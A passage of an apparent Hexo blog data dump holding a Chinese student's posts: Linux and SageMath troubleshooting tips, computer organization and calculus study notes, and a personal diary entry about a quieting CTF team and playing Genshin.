class=\"built_in\">ln</span> -s /usr/lib/x86_64-linux-gnu/libsingular-factory-4.3.2.so /usr/lib/x86_64-linux-gnu/libsingular-factory-4.3.1.so</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"10-0\"><a href=\"#10-0\" class=\"headerlink\" title=\"10.0\"></a>10.0</h3><p>重装了下系统，用 WSL 2 装了 Sagemath 10.0，直接按官方的 <code>mamba create -n sage sage python=3.11</code> 安装后，运行会报错：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sage</span><br><span class=\"line\">┌────────────────────────────────────────────────────────────────────┐</span><br><span class=\"line\">│ SageMath version 10.0, Release Date: 2023-05-20                    │</span><br><span class=\"line\">│ Using Python 3.11.5. Type <span class=\"string\">&quot;help()&quot;</span> <span class=\"keyword\">for</span> <span class=\"built_in\">help</span>.                       │</span><br><span class=\"line\">└────────────────────────────────────────────────────────────────────┘</span><br><span class=\"line\">┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓</span><br><span class=\"line\">┃ Warning: sage.all is not available; this is a limited REPL.        ┃</span><br><span class=\"line\">┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛</span><br><span class=\"line\">sage:</span><br></pre></td></tr></table></figure>\n\n<p>而且在 python 里 <code>import sage.all</code> 也会报错：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python</span><br><span class=\"line\">Python 3.11.5 (main, Sep 11 2023, 13:54:46) [GCC 11.2.0] on linux</span><br><span class=\"line\">Type <span class=\"string\">&quot;help&quot;</span>, <span class=\"string\">&quot;copyright&quot;</span>, <span class=\"string\">&quot;credits&quot;</span> or <span class=\"string\">&quot;license&quot;</span> <span class=\"keyword\">for</span> more information.</span><br><span class=\"line\">&gt;&gt;&gt; from sage.all import *</span><br><span class=\"line\">Traceback (most recent call last):</span><br><span class=\"line\">  File <span class=\"string\">&quot;&lt;stdin&gt;&quot;</span>, line 1, <span class=\"keyword\">in</span> &lt;module&gt;</span><br><span class=\"line\">  File <span class=\"string\">&quot;/home/xxx/mambaforge/envs/sage/lib/python3.11/site-packages/sage/all.py&quot;</span>, line 75, <span class=\"keyword\">in</span> &lt;module&gt;</span><br><span class=\"line\">    from sage.misc.all       import *         <span class=\"comment\"># takes a while</span></span><br><span class=\"line\">    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class=\"line\">  File <span class=\"string\">&quot;/home/xxx/mambaforge/envs/sage/lib/python3.11/site-packages/sage/misc/all.py&quot;</span>, line 72, <span class=\"keyword\">in</span> &lt;module&gt;</span><br><span class=\"line\">    from .functional import (additive_order,</span><br><span class=\"line\">  File <span class=\"string\">&quot;/home/xxx/mambaforge/envs/sage/lib/python3.11/site-packages/sage/misc/functional.py&quot;</span>, line 26, <span class=\"keyword\">in</span> &lt;module&gt;</span><br><span class=\"line\">    from sage.rings.complex_double import CDF</span><br><span class=\"line\">ImportError: libgsl.so.25: cannot open shared object file: No such file or directory</span><br><span class=\"line\">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>\n\n<p>又尝试去源码 build，失败，最后和 GPT 通力合作（我们两个真厉害），发现是环境变量的问题，执行下面的命令就好了（<code>xxx</code> 要换成你的用户名）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> LD_LIBRARY_PATH=/home/xxx/mambaforge/pkgs/gsl-2.7-he838d99_0/lib:<span class=\"variable\">$LD_LIBRARY_PATH</span></span><br></pre></td></tr></table></figure>\n\n<p>当然这样十分麻烦，每次启动 sage 环境要重新设置一次，所以可以把这个命令加到 mamba 启动时的脚本里。<br>首先看看你 sage 装在哪：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mamba <span class=\"built_in\">env</span> list</span><br></pre></td></tr></table></figure>\n\n<p>然后在目录的 <code>etc/conda/activate.d/sage-activate.sh</code> 里末尾补一条 <code>export</code> 命令就好了。</p>\n<h2 id=\"后台进程\"><a href=\"#后台进程\" class=\"headerlink\" title=\"后台进程\"></a>后台进程</h2><p>以下命令可以让程序在后台运行，避免退出终端时就断掉：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nohub &lt;<span class=\"built_in\">command</span>&gt; &amp;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"VMWare-安装-Kali-Linux-后启动黑屏\"><a href=\"#VMWare-安装-Kali-Linux-后启动黑屏\" class=\"headerlink\" title=\"VMWare 安装 Kali Linux 后启动黑屏\"></a>VMWare 安装 Kali Linux 后启动黑屏</h2><p>用管理员运行cmd，输入命令 <code>netsh winsock reset</code>，重启电脑，这时能看到了，但是很卡，再关闭 3D 加速就好了。<br>后来发现我操作系统勾的是 Windows，不知道有没有关系。</p>\n<h2 id=\"改-etc-hosts-后-squid-不能马上生效\"><a href=\"#改-etc-hosts-后-squid-不能马上生效\" class=\"headerlink\" title=\"改 /etc/hosts 后 squid 不能马上生效\"></a>改 <code>/etc/hosts</code> 后 squid 不能马上生效</h2><p>重载一下配置文件就好了：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo squid -k reconfigure</span><br></pre></td></tr></table></figure>"},{"title":"计组笔记","date":"2024-06-04T18:10:00.000Z","_content":"\n功夫再高，也怕挂科。\n\n<!--more-->\n\n## 第一章 概述\n\nCPU 主要由**运算器**和**控制器**组成。\n高速缓存 cache 采用 SRAM，内存采用 DRAM。\nMIPS 和 ARM 都属于 RISC（Reduced Instruction Set Computer），x86 属于 CISC（Complex Instruction Set Computer）。\n**Amdahl 定律**：$t_{new} = t_{related}/S + t_{unrelated}$，$S$ 为**加速比**。\n\n时钟周期数 = 指令数 x 平均每条指令所需周期数（即cycles = IC x CPI）\nCPU 执行时间 = 指令数 x CPI x 时钟周期长（即 CPUtimes = IC x CPI x T）\n或 **CPUtimes = IC x CPI / f**\n\n**能耗** = 负载电容 x 电压^2\n**功耗** = 1/2 x 负载电容 x 电压^2 x 开关频率\n\n## 指令\n\n## 算术运算\n\n## 处理器\n\n## 存储层次\n\n## 参考\n\n<https://www.bilibili.com/video/BV1je4y1Q7BK>\n","source":"_posts/计组笔记.md","raw":"---\ntitle: 计组笔记\ndate: 2024-06-05 02:10:00\ntags: [计组, 汇编]\ncategories: 学习\n---\n\n功夫再高，也怕挂科。\n\n<!--more-->\n\n## 第一章 概述\n\nCPU 主要由**运算器**和**控制器**组成。\n高速缓存 cache 采用 SRAM，内存采用 DRAM。\nMIPS 和 ARM 都属于 RISC（Reduced Instruction Set Computer），x86 属于 CISC（Complex Instruction Set Computer）。\n**Amdahl 定律**：$t_{new} = t_{related}/S + t_{unrelated}$，$S$ 为**加速比**。\n\n时钟周期数 = 指令数 x 平均每条指令所需周期数（即cycles = IC x CPI）\nCPU 执行时间 = 指令数 x CPI x 时钟周期长（即 CPUtimes = IC x CPI x T）\n或 **CPUtimes = IC x CPI / f**\n\n**能耗** = 负载电容 x 电压^2\n**功耗** = 1/2 x 负载电容 x 电压^2 x 开关频率\n\n## 指令\n\n## 算术运算\n\n## 处理器\n\n## 存储层次\n\n## 参考\n\n<https://www.bilibili.com/video/BV1je4y1Q7BK>\n","slug":"计组笔记","published":1,"updated":"2024-06-11T07:57:05.912Z","comments":1,"layout":"post","photos":[],"_id":"clxa5zodu001y7slza8d8dq9q","content":"<p>功夫再高，也怕挂科。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"第一章-概述\"><a href=\"#第一章-概述\" class=\"headerlink\" title=\"第一章 概述\"></a>第一章 概述</h2><p>CPU 主要由<strong>运算器</strong>和<strong>控制器</strong>组成。<br>高速缓存 cache 采用 SRAM，内存采用 DRAM。<br>MIPS 和 ARM 都属于 RISC（Reduced Instruction Set Computer），x86 属于 CISC（Complex Instruction Set Computer）。<br><strong>Amdahl 定律</strong>：$t_{new} = t_{related}/S + t_{unrelated}$，$S$ 为<strong>加速比</strong>。</p>\n<p>时钟周期数 = 指令数 x 平均每条指令所需周期数（即cycles = IC x CPI）<br>CPU 执行时间 = 指令数 x CPI x 时钟周期长（即 CPUtimes = IC x CPI x T）<br>或 <strong>CPUtimes = IC x CPI / f</strong></p>\n<p><strong>能耗</strong> = 负载电容 x 电压^2<br><strong>功耗</strong> = 1/2 x 负载电容 x 电压^2 x 开关频率</p>\n<h2 id=\"指令\"><a href=\"#指令\" class=\"headerlink\" title=\"指令\"></a>指令</h2><h2 id=\"算术运算\"><a href=\"#算术运算\" class=\"headerlink\" title=\"算术运算\"></a>算术运算</h2><h2 id=\"处理器\"><a href=\"#处理器\" class=\"headerlink\" title=\"处理器\"></a>处理器</h2><h2 id=\"存储层次\"><a href=\"#存储层次\" class=\"headerlink\" title=\"存储层次\"></a>存储层次</h2><h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://www.bilibili.com/video/BV1je4y1Q7BK\">https://www.bilibili.com/video/BV1je4y1Q7BK</a></p>\n","excerpt":"<p>功夫再高，也怕挂科。</p>","more":"<h2 id=\"第一章-概述\"><a href=\"#第一章-概述\" class=\"headerlink\" title=\"第一章 概述\"></a>第一章 概述</h2><p>CPU 主要由<strong>运算器</strong>和<strong>控制器</strong>组成。<br>高速缓存 cache 采用 SRAM，内存采用 DRAM。<br>MIPS 和 ARM 都属于 RISC（Reduced Instruction Set Computer），x86 属于 CISC（Complex Instruction Set Computer）。<br><strong>Amdahl 定律</strong>：$t_{new} = t_{related}/S + t_{unrelated}$，$S$ 为<strong>加速比</strong>。</p>\n<p>时钟周期数 = 指令数 x 平均每条指令所需周期数（即cycles = IC x CPI）<br>CPU 执行时间 = 指令数 x CPI x 时钟周期长（即 CPUtimes = IC x CPI x T）<br>或 <strong>CPUtimes = IC x CPI / f</strong></p>\n<p><strong>能耗</strong> = 负载电容 x 电压^2<br><strong>功耗</strong> = 1/2 x 负载电容 x 电压^2 x 开关频率</p>\n<h2 id=\"指令\"><a href=\"#指令\" class=\"headerlink\" title=\"指令\"></a>指令</h2><h2 id=\"算术运算\"><a href=\"#算术运算\" class=\"headerlink\" title=\"算术运算\"></a>算术运算</h2><h2 id=\"处理器\"><a href=\"#处理器\" class=\"headerlink\" title=\"处理器\"></a>处理器</h2><h2 id=\"存储层次\"><a href=\"#存储层次\" class=\"headerlink\" title=\"存储层次\"></a>存储层次</h2><h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://www.bilibili.com/video/BV1je4y1Q7BK\">https://www.bilibili.com/video/BV1je4y1Q7BK</a></p>"},{"title":"琐记 - 1","date":"2023-11-20T18:53:00.000Z","_content":"\n第一篇技术无关的闲谈。\n<!--more-->\n\n## 文章名\n\n加个 `-1` 是觉得还会有 `-2`，如今我似乎对技术失去了当初的狂热，以后的琐记估计还是会有的。\n像我这样水平一般的人，博客常年荒寂，估计也没什么人会注意到这篇文章，但是最近的苦恼总得找个地方宣泄下，我又没有写日记的习惯，就写在这里吧，写出来和说出来一样，也能令我舒畅几分。\n若是有人看到，也可当个乐子，我的经历若能博君一笑，甚至能让你有些启发，那就再好不过了。\n\n## 物非人非\n\n转完专业，再次回归 CTF，发现校队和以前相比已经大不相同，去联队的去联队，毕业的毕业，不打比赛的不打比赛，新人也不怎么说话，群里气氛相当尴尬。\n想找到之前几个小菜鸡一起打比赛的感觉，那时虽然做不出来题目，但是大家都很愿意讨论吹水，群里热闹非凡，但是这种景象，我再也找不到了。\n\n## 招新并不是转机\n\n借着 NewStarCTF 和 Hackergame，队里招了一批新人，我并不指望他们现在的技术能很高，谁不是从菜鸡过来的，有兴趣就行嘛。于是我一晚上搓了个 kali 的 ssh 密钥 adder 给他们玩，想让他们学一下 PoW 和 ssh。但是他们似乎并不感兴趣，虽然是并没有投入很多心力做的事情，但是还是感觉比较落寞。\n\n## 原神，启动\n\n在 GZTime 学长的劝导下，我也觉得可能是我太急了，于是我放弃了挣扎，打开了原神，开始了我的冒险之旅。\n之前我很难想象这么无聊的游戏怎么会有人玩，但是这下从诋毁原神，到理解原神了。\n在我现在的阶段中，原神更像是一个逃避现实的桃源，接触里面的世界和读玄幻小说一样，令人心驰神往。\n米哈游太精明了，二次元的钱太好赚了，我震惊于一个赌博游戏能合理地存在于现代的璃月中，如此庞大数量的、代表人类苦难生产力的货币，投入到虚无缥缈的概率中。\n在闲鱼花 45r 刷了 5000 原石，初次接触这些，我并不知道用的是科技，于是号被封了 7 天。\n高中同学早退游了，把号给我玩，一块钱没充，我给他抽了个水神出来，然后又把最新的剧情过完后，觉得很无聊，想玩自己的号了。\n\n还有两天解封，我不知道现实能不能趁机拯救我。\n","source":"_posts/琐记 - 1.md","raw":"---\ntitle: 琐记 - 1\ndate: 2023-11-21 02:53:00\ntags: 杂谈\ncategories: 生活\n---\n\n第一篇技术无关的闲谈。\n<!--more-->\n\n## 文章名\n\n加个 `-1` 是觉得还会有 `-2`，如今我似乎对技术失去了当初的狂热，以后的琐记估计还是会有的。\n像我这样水平一般的人，博客常年荒寂，估计也没什么人会注意到这篇文章，但是最近的苦恼总得找个地方宣泄下，我又没有写日记的习惯，就写在这里吧，写出来和说出来一样，也能令我舒畅几分。\n若是有人看到，也可当个乐子，我的经历若能博君一笑，甚至能让你有些启发，那就再好不过了。\n\n## 物非人非\n\n转完专业，再次回归 CTF，发现校队和以前相比已经大不相同，去联队的去联队，毕业的毕业，不打比赛的不打比赛，新人也不怎么说话，群里气氛相当尴尬。\n想找到之前几个小菜鸡一起打比赛的感觉，那时虽然做不出来题目，但是大家都很愿意讨论吹水，群里热闹非凡，但是这种景象，我再也找不到了。\n\n## 招新并不是转机\n\n借着 NewStarCTF 和 Hackergame，队里招了一批新人，我并不指望他们现在的技术能很高，谁不是从菜鸡过来的，有兴趣就行嘛。于是我一晚上搓了个 kali 的 ssh 密钥 adder 给他们玩，想让他们学一下 PoW 和 ssh。但是他们似乎并不感兴趣，虽然是并没有投入很多心力做的事情，但是还是感觉比较落寞。\n\n## 原神，启动\n\n在 GZTime 学长的劝导下，我也觉得可能是我太急了，于是我放弃了挣扎，打开了原神，开始了我的冒险之旅。\n之前我很难想象这么无聊的游戏怎么会有人玩，但是这下从诋毁原神，到理解原神了。\n在我现在的阶段中，原神更像是一个逃避现实的桃源，接触里面的世界和读玄幻小说一样，令人心驰神往。\n米哈游太精明了，二次元的钱太好赚了，我震惊于一个赌博游戏能合理地存在于现代的璃月中，如此庞大数量的、代表人类苦难生产力的货币，投入到虚无缥缈的概率中。\n在闲鱼花 45r 刷了 5000 原石，初次接触这些，我并不知道用的是科技，于是号被封了 7 天。\n高中同学早退游了，把号给我玩，一块钱没充，我给他抽了个水神出来，然后又把最新的剧情过完后，觉得很无聊，想玩自己的号了。\n\n还有两天解封，我不知道现实能不能趁机拯救我。\n","slug":"琐记 - 1","published":1,"updated":"2024-06-03T06:41:53.299Z","comments":1,"layout":"post","photos":[],"_id":"clxa5zodv00207slz1c19afpw","content":"<p>第一篇技术无关的闲谈。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"文章名\"><a href=\"#文章名\" class=\"headerlink\" title=\"文章名\"></a>文章名</h2><p>加个 <code>-1</code> 是觉得还会有 <code>-2</code>，如今我似乎对技术失去了当初的狂热，以后的琐记估计还是会有的。<br>像我这样水平一般的人，博客常年荒寂，估计也没什么人会注意到这篇文章，但是最近的苦恼总得找个地方宣泄下，我又没有写日记的习惯，就写在这里吧，写出来和说出来一样，也能令我舒畅几分。<br>若是有人看到，也可当个乐子，我的经历若能博君一笑，甚至能让你有些启发，那就再好不过了。</p>\n<h2 id=\"物非人非\"><a href=\"#物非人非\" class=\"headerlink\" title=\"物非人非\"></a>物非人非</h2><p>转完专业，再次回归 CTF，发现校队和以前相比已经大不相同，去联队的去联队，毕业的毕业，不打比赛的不打比赛，新人也不怎么说话，群里气氛相当尴尬。<br>想找到之前几个小菜鸡一起打比赛的感觉，那时虽然做不出来题目，但是大家都很愿意讨论吹水，群里热闹非凡，但是这种景象，我再也找不到了。</p>\n<h2 id=\"招新并不是转机\"><a href=\"#招新并不是转机\" class=\"headerlink\" title=\"招新并不是转机\"></a>招新并不是转机</h2><p>借着 NewStarCTF 和 Hackergame，队里招了一批新人，我并不指望他们现在的技术能很高，谁不是从菜鸡过来的，有兴趣就行嘛。于是我一晚上搓了个 kali 的 ssh 密钥 adder 给他们玩，想让他们学一下 PoW 和 ssh。但是他们似乎并不感兴趣，虽然是并没有投入很多心力做的事情，但是还是感觉比较落寞。</p>\n<h2 id=\"原神，启动\"><a href=\"#原神，启动\" class=\"headerlink\" title=\"原神，启动\"></a>原神，启动</h2><p>在 GZTime 学长的劝导下，我也觉得可能是我太急了，于是我放弃了挣扎，打开了原神，开始了我的冒险之旅。<br>之前我很难想象这么无聊的游戏怎么会有人玩，但是这下从诋毁原神，到理解原神了。<br>在我现在的阶段中，原神更像是一个逃避现实的桃源，接触里面的世界和读玄幻小说一样，令人心驰神往。<br>米哈游太精明了，二次元的钱太好赚了，我震惊于一个赌博游戏能合理地存在于现代的璃月中，如此庞大数量的、代表人类苦难生产力的货币，投入到虚无缥缈的概率中。<br>在闲鱼花 45r 刷了 5000 原石，初次接触这些，我并不知道用的是科技，于是号被封了 7 天。<br>高中同学早退游了，把号给我玩，一块钱没充，我给他抽了个水神出来，然后又把最新的剧情过完后，觉得很无聊，想玩自己的号了。</p>\n<p>还有两天解封，我不知道现实能不能趁机拯救我。</p>\n","excerpt":"<p>第一篇技术无关的闲谈。</p>","more":"<h2 id=\"文章名\"><a href=\"#文章名\" class=\"headerlink\" title=\"文章名\"></a>文章名</h2><p>加个 <code>-1</code> 是觉得还会有 <code>-2</code>，如今我似乎对技术失去了当初的狂热，以后的琐记估计还是会有的。<br>像我这样水平一般的人，博客常年荒寂，估计也没什么人会注意到这篇文章，但是最近的苦恼总得找个地方宣泄下，我又没有写日记的习惯，就写在这里吧，写出来和说出来一样，也能令我舒畅几分。<br>若是有人看到，也可当个乐子，我的经历若能博君一笑，甚至能让你有些启发，那就再好不过了。</p>\n<h2 id=\"物非人非\"><a href=\"#物非人非\" class=\"headerlink\" title=\"物非人非\"></a>物非人非</h2><p>转完专业，再次回归 CTF，发现校队和以前相比已经大不相同，去联队的去联队，毕业的毕业，不打比赛的不打比赛，新人也不怎么说话，群里气氛相当尴尬。<br>想找到之前几个小菜鸡一起打比赛的感觉，那时虽然做不出来题目，但是大家都很愿意讨论吹水，群里热闹非凡，但是这种景象，我再也找不到了。</p>\n<h2 id=\"招新并不是转机\"><a href=\"#招新并不是转机\" class=\"headerlink\" title=\"招新并不是转机\"></a>招新并不是转机</h2><p>借着 NewStarCTF 和 Hackergame，队里招了一批新人，我并不指望他们现在的技术能很高，谁不是从菜鸡过来的，有兴趣就行嘛。于是我一晚上搓了个 kali 的 ssh 密钥 adder 给他们玩，想让他们学一下 PoW 和 ssh。但是他们似乎并不感兴趣，虽然是并没有投入很多心力做的事情，但是还是感觉比较落寞。</p>\n<h2 id=\"原神，启动\"><a href=\"#原神，启动\" class=\"headerlink\" title=\"原神，启动\"></a>原神，启动</h2><p>在 GZTime 学长的劝导下，我也觉得可能是我太急了，于是我放弃了挣扎，打开了原神，开始了我的冒险之旅。<br>之前我很难想象这么无聊的游戏怎么会有人玩，但是这下从诋毁原神，到理解原神了。<br>在我现在的阶段中，原神更像是一个逃避现实的桃源，接触里面的世界和读玄幻小说一样，令人心驰神往。<br>米哈游太精明了，二次元的钱太好赚了，我震惊于一个赌博游戏能合理地存在于现代的璃月中，如此庞大数量的、代表人类苦难生产力的货币，投入到虚无缥缈的概率中。<br>在闲鱼花 45r 刷了 5000 原石，初次接触这些，我并不知道用的是科技，于是号被封了 7 天。<br>高中同学早退游了，把号给我玩，一块钱没充，我给他抽了个水神出来，然后又把最新的剧情过完后，觉得很无聊，想玩自己的号了。</p>\n<p>还有两天解封，我不知道现实能不能趁机拯救我。</p>"},{"title":"高数上笔记","date":"2023-05-05T10:53:00.000Z","_content":"\n忽然能转了，尝试速成高数上。\n<!--more-->\n\n## 前言\n\n有空再写。\n\n## 笔记正文\n\n### 第一章 函数与极限\n\n#### 连续函数\n\n##### 间断点的分类\n\n### 第二章 微积分的基本概念\n\n#### 不定积分\n\n##### 积分表\n\n1. $\\int x^\\alpha\\mathrm dx = \\frac{1}{\\alpha+1}x^{\\alpha+1}+C(\\alpha\\neq-1)$\n2. $\\int\\cos x\\mathrm dx = \\sin x+C$;$\\int\\sin x\\mathrm dx = -\\cos x+C$\n3. $\\int\\sec^2x\\mathrm dx = \\tan x+C$;$\\int\\csc^2x\\mathrm dx = -\\cot x+C$\n4. $\\int\\frac{\\mathrm dx}{1+x^2} = \\arctan x+C$;$\\int\\frac{\\mathrm dx}{\\sqrt{1-x^2}} = \\arcsin x+C$\n5. $\\int\\alpha^x\\mathrm dx = \\frac{1}{\\ln\\alpha}\\alpha^x+C(\\alpha>0,\\alpha\\neq1)$\n6. $\\int\\frac1x\\mathrm dx = \\ln|x|+C$\n\n### 第三章 积分的计算及应用\n\n### 第四章 微分中值定理与泰勒公式\n\n微分中值定理又称为**拉格朗日中值定理**：设 $y=f(x)$ 在 $[a,b]$ 上连续，在 $(a,b)$ 内可导，则必存在一点 $c\\in(a,b)$，使得\n$$\nf'(c) = \\frac{f(b)-f(a)}{b-a}\n$$\n\n**例** 证明当 $e < a < b < e^2$ 时，$(b-a)\\frac{2}{e^2}<\\ln^2b-\\ln^2a<\\frac4e(b-a)$\n**解**\n\n#### 泰勒公式\n\n常用 $\\ (x\\rightarrow0)$：\n\n1. $e^x=1+x+\\frac{1}{2!}x^2+\\cdots+\\frac{1}{n!}x^n+o(x^n)$\n2. $\\sin x = x - \\frac{1}{3!}x^3 + \\cdots + (-1)^{n-1}\\frac{x^{2n-1}}{(2n-1)!} + o(x^{2n})$\n3. $\\cos x = 1 - \\frac{1}{2!}x^2 + \\cdots + (-1)^n\\frac{x^{2n}}{(2n)!} + o(x^{2n+1})$\n4. $\\ln(1+x) = x - \\frac{x^2}{2} + \\frac{x^3}{3} + \\cdots + (-1)^{n-1}\\frac{x^n}{n} + o(x^n)$\n5. $(1+x)^\\alpha = 1 + \\alpha x + \\frac{\\alpha(\\alpha-1)}{2!}x^2 + \\cdots + \\frac{\\alpha(\\alpha-1)\\cdots(\\alpha-n+1)}{n!}x^n + o(x^n)$\n\n### 第五章 向量代数与空间解析几何\n","source":"_posts/高数上笔记.md","raw":"---\ntitle: 高数上笔记\ndate: 2023-05-05 18:53:00\ntags: [数学,高数]\ncategories: 学习\n---\n\n忽然能转了，尝试速成高数上。\n<!--more-->\n\n## 前言\n\n有空再写。\n\n## 笔记正文\n\n### 第一章 函数与极限\n\n#### 连续函数\n\n##### 间断点的分类\n\n### 第二章 微积分的基本概念\n\n#### 不定积分\n\n##### 积分表\n\n1. $\\int x^\\alpha\\mathrm dx = \\frac{1}{\\alpha+1}x^{\\alpha+1}+C(\\alpha\\neq-1)$\n2. $\\int\\cos x\\mathrm dx = \\sin x+C$;$\\int\\sin x\\mathrm dx = -\\cos x+C$\n3. $\\int\\sec^2x\\mathrm dx = \\tan x+C$;$\\int\\csc^2x\\mathrm dx = -\\cot x+C$\n4. $\\int\\frac{\\mathrm dx}{1+x^2} = \\arctan x+C$;$\\int\\frac{\\mathrm dx}{\\sqrt{1-x^2}} = \\arcsin x+C$\n5. $\\int\\alpha^x\\mathrm dx = \\frac{1}{\\ln\\alpha}\\alpha^x+C(\\alpha>0,\\alpha\\neq1)$\n6. $\\int\\frac1x\\mathrm dx = \\ln|x|+C$\n\n### 第三章 积分的计算及应用\n\n### 第四章 微分中值定理与泰勒公式\n\n微分中值定理又称为**拉格朗日中值定理**：设 $y=f(x)$ 在 $[a,b]$ 上连续，在 $(a,b)$ 内可导，则必存在一点 $c\\in(a,b)$，使得\n$$\nf'(c) = \\frac{f(b)-f(a)}{b-a}\n$$\n\n**例** 证明当 $e < a < b < e^2$ 时，$(b-a)\\frac{2}{e^2}<\\ln^2b-\\ln^2a<\\frac4e(b-a)$\n**解**\n\n#### 泰勒公式\n\n常用 $\\ (x\\rightarrow0)$：\n\n1. $e^x=1+x+\\frac{1}{2!}x^2+\\cdots+\\frac{1}{n!}x^n+o(x^n)$\n2. $\\sin x = x - \\frac{1}{3!}x^3 + \\cdots + (-1)^{n-1}\\frac{x^{2n-1}}{(2n-1)!} + o(x^{2n})$\n3. $\\cos x = 1 - \\frac{1}{2!}x^2 + \\cdots + (-1)^n\\frac{x^{2n}}{(2n)!} + o(x^{2n+1})$\n4. $\\ln(1+x) = x - \\frac{x^2}{2} + \\frac{x^3}{3} + \\cdots + (-1)^{n-1}\\frac{x^n}{n} + o(x^n)$\n5. $(1+x)^\\alpha = 1 + \\alpha x + \\frac{\\alpha(\\alpha-1)}{2!}x^2 + \\cdots + \\frac{\\alpha(\\alpha-1)\\cdots(\\alpha-n+1)}{n!}x^n + o(x^n)$\n\n### 第五章 向量代数与空间解析几何\n","slug":"高数上笔记","published":1,"updated":"2023-05-14T10:39:05.200Z","comments":1,"layout":"post","photos":[],"_id":"clxa5zody002e7slz4s6q3zxp","content":"<p>忽然能转了，尝试速成高数上。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>有空再写。</p>\n<h2 id=\"笔记正文\"><a href=\"#笔记正文\" class=\"headerlink\" title=\"笔记正文\"></a>笔记正文</h2><h3 id=\"第一章-函数与极限\"><a href=\"#第一章-函数与极限\" class=\"headerlink\" title=\"第一章 函数与极限\"></a>第一章 函数与极限</h3><h4 id=\"连续函数\"><a href=\"#连续函数\" class=\"headerlink\" title=\"连续函数\"></a>连续函数</h4><h5 id=\"间断点的分类\"><a href=\"#间断点的分类\" class=\"headerlink\" title=\"间断点的分类\"></a>间断点的分类</h5><h3 id=\"第二章-微积分的基本概念\"><a href=\"#第二章-微积分的基本概念\" class=\"headerlink\" title=\"第二章 微积分的基本概念\"></a>第二章 微积分的基本概念</h3><h4 id=\"不定积分\"><a href=\"#不定积分\" class=\"headerlink\" title=\"不定积分\"></a>不定积分</h4><h5 id=\"积分表\"><a href=\"#积分表\" class=\"headerlink\" title=\"积分表\"></a>积分表</h5><ol>\n<li>$\\int x^\\alpha\\mathrm dx = \\frac{1}{\\alpha+1}x^{\\alpha+1}+C(\\alpha\\neq-1)$</li>\n<li>$\\int\\cos x\\mathrm dx = \\sin x+C$;$\\int\\sin x\\mathrm dx = -\\cos x+C$</li>\n<li>$\\int\\sec^2x\\mathrm dx = \\tan x+C$;$\\int\\csc^2x\\mathrm dx = -\\cot x+C$</li>\n<li>$\\int\\frac{\\mathrm dx}{1+x^2} = \\arctan x+C$;$\\int\\frac{\\mathrm dx}{\\sqrt{1-x^2}} = \\arcsin x+C$</li>\n<li>$\\int\\alpha^x\\mathrm dx = \\frac{1}{\\ln\\alpha}\\alpha^x+C(\\alpha&gt;0,\\alpha\\neq1)$</li>\n<li>$\\int\\frac1x\\mathrm dx = \\ln|x|+C$</li>\n</ol>\n<h3 id=\"第三章-积分的计算及应用\"><a href=\"#第三章-积分的计算及应用\" class=\"headerlink\" title=\"第三章 积分的计算及应用\"></a>第三章 积分的计算及应用</h3><h3 id=\"第四章-微分中值定理与泰勒公式\"><a href=\"#第四章-微分中值定理与泰勒公式\" class=\"headerlink\" title=\"第四章 微分中值定理与泰勒公式\"></a>第四章 微分中值定理与泰勒公式</h3><p>微分中值定理又称为<strong>拉格朗日中值定理</strong>：设 $y=f(x)$ 在 $[a,b]$ 上连续，在 $(a,b)$ 内可导，则必存在一点 $c\\in(a,b)$，使得<br>$$<br>f’(c) = \\frac{f(b)-f(a)}{b-a}<br>$$</p>\n<p><strong>例</strong> 证明当 $e &lt; a &lt; b &lt; e^2$ 时，$(b-a)\\frac{2}{e^2}&lt;\\ln^2b-\\ln^2a&lt;\\frac4e(b-a)$<br><strong>解</strong></p>\n<h4 id=\"泰勒公式\"><a href=\"#泰勒公式\" class=\"headerlink\" title=\"泰勒公式\"></a>泰勒公式</h4><p>常用 $\\ (x\\rightarrow0)$：</p>\n<ol>\n<li>$e^x=1+x+\\frac{1}{2!}x^2+\\cdots+\\frac{1}{n!}x^n+o(x^n)$</li>\n<li>$\\sin x = x - \\frac{1}{3!}x^3 + \\cdots + (-1)^{n-1}\\frac{x^{2n-1}}{(2n-1)!} + o(x^{2n})$</li>\n<li>$\\cos x = 1 - 